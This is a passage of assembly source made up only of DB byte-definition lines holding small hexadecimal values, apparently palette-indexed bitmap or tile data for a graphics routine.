DB 017H,00CH,019H,018H,00CH,019H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 018H,00CH,019H,01AH,019H,00EH,00EH,005H,005H,005H,005H,005H,005H,005H,004H
DB 000H,003H,01BH,003H,01CH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 003H,01CH,003H,01CH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,003H,01CH,003H,01BH,003H,01BH,003H,01BH,003H,01BH,003H,01CH,003H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,003H,01BH,003H,01BH,000H,000H,000H,000H,000H,000H,000H
DB 01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01CH,003H,01BH
DB 003H,01BH,003H,01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01CH,003H
DB 01BH,003H,000H,000H,000H,010H,00FH,012H,00FH,013H,00FH,012H,010H,005H,012H
DB 012H,00FH,010H,00CH,016H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 013H,016H,01AH,010H,015H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,016H
DB 00CH,01AH,01AH,014H,019H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,014H,00EH
DB 019H,010H,017H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,012H,016H
DB 01AH,01AH,013H,00EH,00EH,005H,005H,005H,005H,005H,005H,005H,002H,000H,003H
DB 01BH,003H,01BH,003H,01CH,01CH,01CH,01CH,01CH,003H,01CH,003H,01BH,003H,01BH
DB 003H,01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,003H
DB 01BH,000H,000H,000H,000H,000H,000H,000H,000H,003H,01BH,003H,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,003H,01CH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,003H,01CH,003H,01CH,003H,01CH,003H,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 003H,01BH,003H,000H,000H,000H,002H,002H,000H,000H,000H,000H,000H,000H,003H
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,003H,01BH,003H,000H,000H,000H
DB 000H,01BH,003H,01CH,01CH,01CH,01CH,01CH,003H,01BH,003H,01BH,003H,01BH,000H
DB 000H,000H,002H,00FH,00FH,013H,013H,012H,010H,008H,010H,013H,012H,00FH,00CH
DB 00EH,019H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,019H,00CH,017H,014H
DB 012H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,017H,00CH,018H,01AH,01AH
DB 012H,016H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,012H,013H,014H,014H
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,018H,00CH,019H,01AH,017H
DB 00CH,00EH,008H,005H,005H,005H,005H,005H,005H,008H,000H,000H,003H,01BH,003H
DB 01BH,003H,01CH,01CH,01CH,003H,01BH,003H,01BH,003H,000H,000H,000H,000H,01BH
DB 003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,003H,000H,000H,000H,000H
DB 000H,002H,000H,000H,000H,000H,000H,000H,01BH,003H,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01CH,003H,01BH,003H
DB 01BH,003H,01CH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 003H,01CH,003H,01BH,003H,01BH,003H,01BH,003H,01BH,003H,01CH,003H,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,003H,002H
DB 009H,008H,006H,00AH,00AH,00AH,006H,005H,002H,000H,000H,000H,003H,01CH,01CH
DB 01CH,01CH,01CH,003H,01BH,003H,01BH,003H,002H,002H,002H,003H,000H,000H,000H
DB 003H,01CH,003H,01CH,003H,01BH,003H,000H,000H,000H,000H,000H,000H,002H,010H
DB 00FH,013H,013H,00FH,012H,010H,008H,013H,00FH,00FH,012H,00CH,016H,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,015H,00CH,00EH,00EH,019H,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,019H,00CH,016H,01AH,01AH,014H,00CH,00EH,019H
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,019H,00EH,00CH,013H,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,013H,014H,01AH,01AH,012H,00EH,00EH
DB 005H,005H,005H,005H,005H,005H,002H,000H,000H,000H,000H,000H,000H,01BH,003H
DB 01CH,003H,01BH,003H,01BH,000H,01BH,002H,002H,002H,000H,000H,000H,003H,01CH
DB 01CH,01CH,01CH,01CH,003H,01BH,003H,01BH,003H,004H,007H,00AH,00AH,00AH,00AH
DB 006H,008H,001H,002H,000H,000H,01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,003H,01CH,003H,01BH,003H,01BH,003H,01BH,003H,01BH,003H
DB 01BH,003H,01CH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,003H,01BH
DB 003H,01BH,000H,000H,000H,000H,003H,01BH,003H,01BH,003H,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,003H,008H,006H,006H,007H,007H
DB 007H,007H,006H,00AH,00AH,011H,00AH,002H,000H,000H,003H,01CH,01CH,01CH,01CH
DB 01CH,003H,01BH,008H,006H,006H,006H,00AH,00AH,006H,002H,000H,000H,003H,01BH
DB 003H,002H,008H,007H,008H,01BH,000H,000H,000H,000H,00FH,012H,014H,014H,00FH
DB 012H,010H,00EH,012H,00FH,00FH,00FH,00CH,00EH,019H,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,012H,00CH,00EH,019H,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,010H,013H,01AH,01AH,015H,00CH,00EH,00CH,016H,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,019H,00CH,00CH,018H,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,018H,00CH,019H,01AH,017H,00CH,00EH,005H,005H,005H
DB 005H,005H,005H,000H,000H,000H,000H,004H,005H,001H,003H,01BH,003H,01BH,003H
DB 01BH,002H,006H,00AH,00AH,006H,006H,006H,001H,000H,000H,003H,01CH,01CH,01CH
DB 01CH,01CH,003H,01BH,009H,00AH,00AH,00AH,006H,007H,007H,008H,007H,007H,006H
DB 006H,008H,000H,000H,01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 003H,01BH,003H,01BH,003H,000H,000H,000H,000H,000H,000H,000H,000H,01BH,003H
DB 01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,003H,01BH,003H,000H,000H,000H
DB 000H,000H,000H,000H,000H,000H,003H,01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,003H,01BH,003H,007H,006H,007H,008H,005H,005H,005H,008H,008H
DB 007H,006H,00AH,00AH,011H,002H,000H,000H,003H,01CH,01CH,01CH,003H,002H,006H
DB 007H,008H,005H,008H,008H,006H,00AH,00AH,002H,000H,01BH,003H,01BH,007H,005H
DB 004H,008H,008H,000H,000H,000H,010H,00FH,013H,013H,014H,00FH,012H,010H,010H
DB 013H,012H,012H,010H,00CH,016H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,018H,00CH,00EH,018H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,014H
DB 00EH,01AH,01AH,018H,00CH,00EH,010H,00EH,00CH,018H,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,017H,00CH,014H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,013H,016H,01AH,01AH,013H,00CH,00EH,005H,005H,005H,005H,005H
DB 005H,000H,000H,001H,004H,001H,008H,004H,003H,01BH,003H,01BH,009H,00AH,00AH
DB 006H,008H,005H,005H,008H,006H,005H,000H,01BH,003H,01CH,01CH,01CH,003H,01BH
DB 009H,011H,00AH,006H,007H,008H,008H,005H,005H,005H,005H,008H,007H,00AH,007H
DB 000H,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,003H,01BH
DB 000H,000H,000H,000H,002H,002H,002H,000H,000H,000H,000H,000H,003H,01BH,003H
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,003H,01BH,003H,000H,000H,01BH,004H,008H,007H,007H,008H,004H
DB 002H,000H,000H,000H,000H,01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,003H,008H,00AH,008H,008H,005H,005H,004H,004H,004H,005H,005H,008H,007H
DB 006H,00AH,00AH,000H,000H,01BH,003H,01CH,003H,01BH,006H,007H,005H,004H,004H
DB 004H,005H,005H,007H,00AH,00AH,01BH,003H,01BH,00BH,008H,009H,002H,002H,008H
DB 002H,000H,009H,013H,013H,013H,013H,00FH,012H,010H,010H,00FH,00FH,012H,010H
DB 00CH,00EH,019H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,013H,00CH
DB 018H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,017H,00CH,018H,01AH,019H
DB 012H,00CH,010H,012H,010H,00CH,012H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,016H,00CH,018H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 018H,012H,01AH,01AH,017H,00CH,00EH,008H,005H,005H,005H,005H,005H,004H,000H
DB 009H,002H,002H,001H,008H,01BH,003H,01BH,003H,00AH,00AH,007H,005H,004H,004H
DB 004H,005H,008H,006H,001H,003H,01BH,003H,01CH,003H,01BH,003H,00AH,00AH,006H
DB 007H,008H,005H,004H,004H,004H,004H,004H,005H,008H,008H,00AH,008H,000H,003H
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,003H,01BH,000H,01BH,008H,006H
DB 00AH,011H,011H,00AH,00AH,006H,008H,002H,000H,000H,000H,01BH,003H,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,003H
DB 01BH,003H,000H,009H,007H,00AH,00AH,00AH,00AH,00AH,011H,011H,011H,00AH,004H
DB 000H,000H,000H,000H,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,002H,00AH
DB 007H,008H,005H,005H,004H,004H,001H,009H,004H,005H,005H,008H,007H,006H,011H
DB 006H,000H,003H,01BH,003H,01BH,00BH,006H,005H,004H,004H,001H,009H,001H,004H
DB 005H,007H,00AH,008H,01BH,003H,005H,008H,008H,009H,002H,004H,002H,000H,012H
DB 013H,013H,00FH,012H,010H,00FH,00EH,010H,013H,00FH,012H,010H,00CH,016H,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,017H,001H,017H,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,019H,00CH,015H,01AH,01AH,014H,00CH,00DH,013H
DB 010H,012H,00EH,00CH,015H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,019H
DB 00CH,013H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,014H,019H
DB 01AH,01AH,012H,00CH,00EH,008H,005H,005H,005H,005H,005H,002H,002H,002H,001H
DB 004H,008H,003H,01BH,003H,008H,00AH,007H,005H,001H,009H,001H,009H,004H,005H
DB 008H,006H,01BH,003H,01BH,003H,01BH,003H,006H,011H,006H,007H,008H,005H,004H
DB 004H,001H,004H,001H,004H,004H,005H,008H,007H,00AH,003H,01BH,003H,01CH,01CH
DB 01CH,01CH,01CH,003H,01BH,003H,000H,000H,005H,00AH,011H,00AH,00AH,00AH,00AH
DB 006H,006H,00AH,00AH,00AH,006H,009H,000H,000H,01BH,003H,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,003H,01BH,003H,01BH,007H
DB 00AH,00AH,006H,007H,007H,006H,006H,006H,00AH,00AH,00AH,011H,00AH,009H,000H
DB 000H,000H,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,007H,006H,008H,005H,004H
DB 001H,004H,001H,009H,001H,009H,001H,004H,005H,008H,006H,00AH,011H,002H,000H
DB 003H,01BH,003H,007H,007H,005H,004H,001H,009H,002H,009H,001H,004H,008H,006H
DB 007H,003H,01BH,009H,007H,008H,001H,004H,004H,000H,004H,013H,00FH,00FH,012H
DB 00FH,013H,00FH,00EH,012H,00FH,00FH,010H,00CH,013H,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,019H,018H,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,019H,010H,016H,01AH,01AH,016H,00CH,00EH,008H,013H,010H,010H,012H
DB 00EH,00EH,018H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,018H,00CH,016H
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,018H,013H,01AH,01AH,018H
DB 00CH,00EH,008H,005H,005H,005H,005H,005H,005H,002H,002H,009H,008H,005H,01CH
DB 003H,01BH,00AH,006H,005H,004H,009H,002H,009H,002H,009H,004H,005H,006H,009H
DB 01BH,003H,01BH,003H,002H,011H,00AH,007H,008H,005H,004H,009H,001H,009H,001H
DB 009H,001H,004H,004H,005H,008H,006H,001H,003H,01CH,01CH,01CH,01CH,01CH,003H
DB 01BH,003H,000H,002H,006H,011H,00AH,00AH,006H,006H,007H,007H,007H,007H,007H
DB 007H,007H,006H,00AH,005H,000H,000H,01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH
DB 000H,000H,01CH,01CH,01CH,01CH,003H,01BH,003H,002H,006H,006H,007H,008H,008H
DB 008H,008H,008H,008H,007H,007H,006H,00AH,00AH,00AH,011H,008H,000H,000H,01BH
DB 003H,01CH,01CH,01CH,01CH,01CH,009H,00AH,007H,005H,005H,004H,009H,001H,009H
DB 002H,009H,001H,009H,001H,004H,005H,008H,006H,011H,008H,000H,01BH,003H,01CH
DB 006H,008H,004H,001H,009H,002H,002H,002H,009H,001H,005H,007H,007H,01BH,003H
DB 01CH,009H,008H,008H,004H,000H,000H,008H,00FH,010H,010H,00FH,013H,00FH,00EH
DB 012H,00FH,013H,00FH,00EH,00CH,018H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,019H,00CH
DB 016H,01AH,01AH,016H,00CH,00EH,005H,005H,013H,012H,010H,010H,012H,00EH,00CH
DB 019H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,018H,00CH,019H,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,00CH,017H,01AH,01AH,016H,00CH,00EH
DB 005H,005H,005H,005H,005H,005H,004H,002H,004H,004H,01CH,01CH,01CH,003H,00AH
DB 007H,004H,009H,002H,009H,002H,009H,002H,004H,005H,007H,004H,003H,01BH,003H
DB 01BH,008H,011H,006H,008H,005H,001H,009H,001H,009H,002H,009H,001H,009H,001H
DB 004H,005H,008H,007H,005H,000H,003H,01CH,01CH,01CH,01CH,01CH,003H,01BH,009H
DB 00AH,011H,00AH,00AH,006H,007H,007H,008H,008H,008H,005H,008H,008H,008H,008H
DB 007H,00AH,008H,000H,000H,01BH,003H,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH
DB 01CH,01CH,003H,01BH,003H,001H,00AH,006H,007H,008H,008H,005H,005H,005H,005H
DB 005H,008H,008H,007H,006H,006H,00AH,00AH,011H,007H,000H,000H,01BH,003H,01CH
DB 01CH,01CH,01CH,001H,00AH,008H,005H,004H,004H,001H,009H,002H,009H,002H,009H
DB 001H,009H,001H,005H,008H,007H,00AH,006H,000H,003H,01CH,01CH,006H,008H,004H
DB 009H,004H,004H,002H,009H,002H,009H,004H,008H,008H,003H,01CH,01CH,01CH,003H
DB 002H,003H,01BH,000H,000H,010H,00FH,00FH,013H,00FH,010H,010H,00FH,00FH,013H
DB 00FH,00CH,014H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,013H,012H,01AH,01AH,017H
DB 00CH,00DH,00EH,005H,005H,013H,012H,012H,010H,010H,010H,00CH,013H,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,019H,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,016H,010H,01AH,01AH,019H,00CH,00EH,008H,005H,005H
DB 005H,005H,005H,004H,000H,003H,01BH,003H,01CH,01CH,01CH,00AH,008H,004H,001H
DB 009H,002H,009H,004H,004H,001H,005H,007H,004H,01BH,003H,01CH,003H,006H,00AH
DB 007H,008H,004H,009H,001H,009H,002H,009H,002H,009H,001H,009H,001H,004H,005H
DB 007H,007H,000H,01CH,01CH,01CH,01CH,01CH,003H,01BH,002H,011H,011H,00AH,006H
DB 006H,007H,008H,008H,005H,005H,004H,005H,005H,005H,005H,008H,008H,007H,00AH
DB 009H,000H,003H,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH
DB 003H,002H,00AH,006H,008H,008H,005H,005H,005H,004H,005H,004H,005H,005H,005H
DB 008H,008H,007H,006H,00AH,00AH,011H,005H,000H,000H,01CH,01CH,01CH,01CH,01CH
DB 00BH,006H,008H,005H,004H,001H,009H,002H,009H,002H,009H,002H,009H,001H,009H
DB 004H,005H,008H,00AH,00AH,000H,01CH,01CH,01CH,007H,008H,004H,005H,006H,007H
DB 009H,002H,009H,001H,004H,008H,008H,01CH,01CH,01CH,01CH,01CH,003H,01BH,003H
DB 000H,002H,00FH,013H,00FH,00FH,012H,010H,013H,00FH,00FH,013H,010H,00CH,018H
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,016H,00CH,019H,01AH,019H,00DH,00DH,00EH,010H
DB 008H,005H,013H,012H,012H,010H,008H,00EH,010H,00CH,017H,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,019H,00CH,017H,01AH,01AH,014H,00CH,00EH,005H,005H,005H,005H,005H
DB 000H,000H,01BH,003H,01CH,01CH,01CH,01CH,006H,008H,004H,009H,002H,009H,001H
DB 006H,007H,004H,005H,006H,001H,003H,01CH,01CH,01CH,00AH,00AH,008H,005H,004H
DB 001H,009H,002H,009H,002H,009H,002H,009H,001H,009H,004H,005H,008H,006H,01BH
DB 003H,01CH,01CH,01CH,003H,01BH,003H,00AH,011H,00AH,006H,007H,007H,008H,005H
DB 005H,005H,004H,004H,004H,004H,004H,005H,005H,008H,008H,006H,00AH,002H,000H
DB 003H,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,003H,01BH,006H,006H
DB 007H,008H,005H,005H,005H,004H,004H,004H,004H,004H,004H,005H,005H,008H,008H
DB 007H,006H,00AH,00AH,011H,002H,000H,003H,01CH,01CH,01CH,01CH,005H,006H,008H
DB 005H,004H,009H,001H,009H,002H,002H,002H,009H,002H,009H,001H,004H,005H,008H
DB 006H,00AH,000H,003H,01CH,01CH,008H,006H,005H,008H,006H,007H,001H,009H,001H
DB 004H,005H,007H,008H,01CH,01CH,01CH,01CH,01CH,01CH,003H,000H,000H,012H,00FH
DB 00FH,00FH,00FH,007H,012H,013H,00FH,013H,00FH,00CH,014H,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,018H,00CH,018H,01AH,01AH,013H,00CH,00EH,008H,012H,005H,005H,013H
DB 012H,012H,010H,008H,008H,00EH,00EH,00EH,019H,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 016H,00CH,01AH,01AH,019H,00EH,00EH,008H,005H,005H,005H,005H,002H,000H,000H
DB 01BH,003H,01CH,01CH,01CH,007H,007H,005H,004H,009H,002H,009H,006H,007H,005H
DB 008H,006H,003H,01CH,01CH,01CH,003H,00AH,006H,008H,005H,001H,009H,002H,009H
DB 002H,009H,002H,009H,001H,009H,001H,004H,005H,008H,006H,003H,01CH,01CH,01CH
DB 01CH,01CH,003H,008H,011H,00AH,006H,007H,007H,008H,005H,004H,004H,001H,004H
DB 001H,004H,004H,004H,004H,005H,005H,008H,008H,00AH,007H,000H,01BH,003H,01CH
DB 01CH,01CH,01CH,000H,000H,01CH,01CH,003H,01BH,005H,00AH,007H,008H,005H,005H
DB 005H,004H,004H,001H,004H,001H,009H,001H,004H,004H,005H,008H,008H,007H,006H
DB 00AH,011H,00AH,000H,01BH,003H,01CH,01CH,01CH,00BH,006H,008H,005H,004H,001H
DB 005H,008H,008H,001H,002H,002H,009H,001H,009H,004H,005H,008H,006H,006H,003H
DB 01CH,01CH,01CH,01CH,006H,008H,005H,005H,004H,004H,001H,004H,005H,008H,006H
DB 009H,01CH,01CH,01CH,01CH,01CH,003H,01BH,000H,005H,00FH,00FH,00FH,00FH,00FH
DB 007H,00FH,013H,012H,013H,00DH,00CH,018H,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,019H,00CH
DB 015H,01AH,01AH,016H,00CH,00DH,008H,010H,010H,005H,005H,014H,012H,012H,012H
DB 00EH,008H,008H,010H,00CH,013H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,00EH,016H
DB 01AH,01AH,016H,00CH,00EH,005H,005H,005H,005H,005H,000H,000H,003H,01BH,003H
DB 01CH,01CH,001H,006H,008H,005H,004H,004H,001H,005H,005H,005H,006H,008H,01CH
DB 01CH,01CH,01CH,01CH,00AH,006H,008H,004H,004H,001H,009H,002H,009H,002H,005H
DB 008H,008H,005H,004H,004H,005H,008H,006H,01BH,003H,01CH,01CH,01CH,003H,002H
DB 011H,00AH,00AH,006H,007H,008H,005H,004H,004H,001H,009H,001H,009H,001H,004H
DB 001H,004H,004H,005H,005H,008H,007H,00AH,002H,000H,01CH,01CH,01CH,01CH,01CH
DB 000H,000H,01CH,01CH,01CH,003H,006H,006H,008H,008H,005H,005H,004H,004H,001H
DB 009H,001H,009H,001H,009H,001H,004H,004H,005H,008H,008H,007H,006H,00AH,011H
DB 001H,000H,01CH,01CH,01CH,01CH,001H,00AH,008H,005H,004H,005H,007H,00AH,006H
DB 004H,002H,009H,002H,009H,001H,004H,005H,008H,006H,006H,01BH,003H,01CH,01CH
DB 01CH,00BH,006H,007H,005H,005H,005H,005H,005H,008H,006H,00BH,01CH,01CH,01CH
DB 01CH,01CH,003H,01BH,003H,002H,00FH,00FH,00FH,00FH,00FH,007H,012H,013H,00FH
DB 012H,013H,00DH,013H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,014H,014H,01AH,01AH,015H
DB 00CH,00DH,00EH,00EH,010H,010H,005H,005H,00FH,012H,012H,012H,00EH,008H,005H
DB 008H,010H,00CH,016H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,017H,00CH,019H,01AH,019H
DB 00EH,00CH,008H,005H,005H,005H,005H,002H,000H,01BH,003H,01CH,01CH,01CH,01CH
DB 005H,006H,008H,005H,005H,005H,005H,008H,006H,007H,01CH,01CH,01CH,01CH,01CH
DB 01CH,006H,006H,008H,005H,004H,009H,001H,009H,002H,009H,008H,006H,00AH,007H
DB 005H,004H,005H,007H,008H,003H,01CH,01CH,01CH,003H,01BH,008H,011H,00AH,006H
DB 007H,008H,005H,004H,004H,001H,009H,001H,009H,001H,009H,001H,009H,001H,004H
DB 004H,005H,005H,007H,00AH,008H,000H,003H,01CH,01CH,01CH,01CH,000H,000H,01CH
DB 01CH,003H,001H,00AH,007H,008H,005H,005H,004H,004H,001H,009H,001H,009H,001H
DB 009H,001H,009H,001H,004H,004H,005H,008H,007H,006H,00AH,011H,008H,000H,003H
DB 01CH,01CH,01CH,01CH,006H,007H,008H,005H,005H,006H,00AH,006H,004H,009H,002H
DB 009H,001H,004H,004H,005H,008H,00AH,005H,003H,01CH,01CH,01CH,01CH,01CH,00BH
DB 006H,006H,007H,007H,007H,006H,006H,00BH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 003H,000H,008H,00AH,00FH,00FH,006H,00FH,006H,00FH,013H,00FH,00FH,00FH,00DH
DB 013H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,018H,013H,01AH,01AH,017H,00CH,00DH,010H,00EH
DB 012H,012H,010H,005H,005H,00FH,012H,012H,010H,00EH,00EH,008H,005H,00EH,00DH
DB 00CH,018H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,00EH,016H,01AH,01AH,016H,00CH,00EH
DB 005H,005H,005H,005H,005H,000H,003H,01BH,003H,01CH,01CH,01CH,01CH,005H,006H
DB 006H,007H,007H,007H,006H,008H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,005H,00AH
DB 008H,005H,004H,001H,009H,001H,009H,001H,008H,006H,00AH,006H,005H,004H,008H
DB 006H,005H,01CH,01CH,01CH,01CH,01CH,003H,00AH,00AH,006H,007H,008H,005H,005H
DB 004H,001H,009H,001H,009H,001H,009H,001H,009H,001H,009H,001H,004H,004H,005H
DB 008H,006H,006H,000H,01BH,003H,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,008H
DB 00AH,008H,008H,005H,004H,004H,001H,009H,001H,009H,001H,009H,002H,009H,001H
DB 009H,001H,004H,004H,005H,008H,007H,006H,00AH,006H,000H,01CH,01CH,01CH,01CH
DB 01CH,008H,00AH,008H,005H,005H,008H,007H,008H,009H,001H,009H,001H,004H,004H
DB 005H,008H,007H,00AH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,005H,007H
DB 007H,007H,005H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,000H,007H
DB 00FH,006H,006H,00FH,00FH,006H,00FH,00FH,00FH,00FH,00FH,00DH,00DH,019H,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,019H,00CH,019H,01AH,018H,00CH,00DH,00FH,010H,010H,012H,012H,010H
DB 008H,005H,013H,012H,012H,012H,010H,00EH,008H,005H,005H,00EH,00EH,012H,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,016H,00EH,01AH,01AH,019H,00CH,00EH,005H,005H,005H
